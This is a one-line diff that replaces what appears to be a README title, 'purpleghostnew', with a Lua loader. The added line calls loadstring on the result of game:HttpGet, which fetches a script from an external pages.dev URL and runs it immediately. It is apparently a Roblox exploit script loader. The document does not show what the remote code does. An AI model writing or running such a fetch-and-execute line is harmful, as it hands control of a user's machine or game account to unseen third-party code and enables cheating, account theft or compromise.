@@ -1,1 +1,1 @@
-# purpleghostnew
+loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=4463708186112"))("4463708186112")
